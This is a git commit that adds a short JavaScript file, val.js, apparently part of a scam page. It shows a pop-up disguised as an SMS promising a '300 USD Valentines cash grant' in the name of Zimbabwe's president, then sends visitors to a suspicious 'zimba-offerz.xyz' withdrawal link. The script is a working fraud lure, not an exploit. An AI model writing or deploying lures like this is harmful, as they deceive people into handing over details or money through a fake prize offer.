bc541e72924eceddc35924d10b1e9cb0215d35d3
bigetijazz23 <bigetijazz23@gmail.com>
2025-01-26 13:11:10 +0100

    Create val.js

---
+++ val.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 300 USD'
+password=prompt('SMS: Congratulations, you are eligible for EMMERSON DAMBUDZO 300 USD VALENTINES CASH GRANT FOR ALL, Please press OK to CLAIM Cash Prize','CLAIM 300 USD');
+if (password != 'CLAIM 300 USD') {
+location.href='https://www.zimba-offerz.xyz/withdraw-300USD';
+}
